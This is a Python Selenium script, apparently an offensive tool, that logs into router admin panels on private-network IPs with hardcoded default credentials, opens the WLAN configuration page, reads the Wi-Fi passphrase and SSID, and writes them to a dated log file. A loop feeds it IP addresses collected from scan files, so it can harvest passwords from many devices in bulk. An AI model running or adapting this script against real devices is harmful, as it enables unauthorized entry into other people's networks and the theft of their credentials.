from logging import error
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException  # Add this import
from selenium.common.exceptions import NoSuchElementException  # Import NoSuchElementException
import re
import glob
from datetime import datetime


chrome_options = Options()
chrome_options.add_experimental_option("detach", True)

#172.16.0.58 or 48
# Github credentials
username = "superadmin"
password = "suportadmin"
from selenium.webdriver.chrome.service import Service


service = Service(executable_path='d:\mengoding\hekwifi\chromedriver.exe')
    
counter = 0
error_message = "Incorrect username or password."
driver = webdriver.Chrome(service=service)
f = open( datetime.now().strftime("%d-%m-%Y")+".txt", "a")


def getPassword(ip):

    try:
        print("[+] Trying", ip)
        driver.execute_script("window.open('');")  # Open a new tab
        driver.switch_to.window(driver.window_handles[-1])

        driver.get("http://"+ip)
        # find username/email field and send the username itself to the input field
        driver.find_element("id", "Frm_Username").send_keys(username)
        # find password input field and insert password as well
        driver.find_element("id", "Frm_Password").send_keys(password)
        # click login button
        driver.find_element("id", "LoginId").click()

        WebDriverWait(driver, 3).until(EC.invisibility_of_element_located((By.ID, "Frm_Username")))
        # if(        driver.find_element("id", "Frm_Username").send_keys(username))
        print("[+] Login successful")
        print("[+] Login successful")
        driver.get("http://"+ip+"/getpage.gch?pid=1002&nextpage=pon_net_wlan_conf1_t.gch")
        # if not (driver.find_element("id", "Img_KeyPassphrase")):
        #     raise Exception("TimeoutException")
        driver.find_element("id", "Img_KeyPassphrase").click()
        a = driver.execute_script("return(document.getElementById('Frm_KeyPassphrase').value)")
        # driver.get("http://"+ip+"/getpage.gch?pid=1002&nextpage=net_wlanm_essid1_t.gch")
        b = driver.execute_script("return(document.getElementById('Frm_ESSID').value)")
        res = ip+" : "+b+" "+a
        print(res)
        f.write(res+"\n")
        driver.execute_script("window.close('');")
        f.close()


    # except NoSuchElementException:
    #     print("[!] Element not found, skipping...")
    #     driver.execute_script("window.close('');")
    except TimeoutException:
        print("[!] Login failed")
        f.write(ip+" : failed\n" )
        f.close()
        driver.execute_script("window.close('');")
        # driver.quit()  # Close only the current tab

    

getPassword("172.16.0.108")

pattern = r'\d+\.\d+\.\d+\.\d+'
# strdate =  datetime.now()
# print(datetime.now().strftime("%d-%m-%Y"))
# all()
# Find all IP addresses in the data
def all():
    for filename in glob.glob("172.16.*.txt"):
        with open(filename, "r") as file:
            for line in file:
                ip = re.findall(pattern, line)
                # print(ip[0])
                if ip:
                    print(str(ip[0]))
                    getPassword(str(ip[0]))


            # print(ip)
            # if ip:  # Check if the line is not empty
            #     # getPassword(line)
            #     print(line)

